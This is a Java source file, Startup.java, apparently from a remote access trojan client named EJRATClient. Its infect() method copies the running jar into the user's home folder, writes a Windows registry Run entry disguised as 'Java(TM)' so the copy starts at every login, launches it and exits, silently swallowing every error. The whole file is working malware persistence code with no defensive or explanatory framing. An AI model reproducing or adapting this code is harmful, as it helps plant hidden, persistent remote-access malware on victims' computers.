/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ej.ratclient.util;

import ej.ratclient.EJRATClient;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.channels.FileChannel;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 *
 * @author Amjad
 */
public class Startup {

    private static final String path = System.getProperty("user.home") + File.separator + getLocalFilename();

    public static void infect() {
        final ExecutorService thread = Executors.newSingleThreadExecutor();
        thread.submit(new Runnable() {

            public void run() {
                Runtime rt = Runtime.getRuntime();
                switch (OperatingSystem.OPERATING_SYSTEM) {
                    case WINDOWS:
                        copyFile(getJarLocation(), path);
                        try {
                            rt.exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Java(TM) /t REG_SZ /d " + path);
                            rt.exec("java -jar " + path);
                        } catch (Exception ignored) {
                        }
                        break;
                    case MAC:
                        break;
                    case LINUX:
                        break;
                }
                System.exit(0);
            }
        });
    }

    private static void copyFile(String srFile, String dtFile) {
        try {
            File in = new File(srFile);
            File out = new File(dtFile);
            FileChannel inChannel = new FileInputStream(in).getChannel();
            FileChannel outChannel = new FileOutputStream(out).getChannel();
            try {
                inChannel.transferTo(0, inChannel.size(),
                        outChannel);
            } catch (Exception ignored) {
            } finally {
                if (inChannel != null) {
                    inChannel.close();
                }
                if (outChannel != null) {
                    outChannel.close();
                }
            }
        } catch (Exception ignored) {
        }
    }

    private static String getJarLocation() {
        try {
            return EJRATClient.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (Exception ignored) {
        }
        return null;
    }

    private static String getLocalFilename() {
        String file = getJarLocation();
        int i = file.lastIndexOf("/");
        if (i != -1 && i < file.length() - 1) {
            return file.substring(i + 1);
        } else {
            return "java.jar";
        }
    }
}
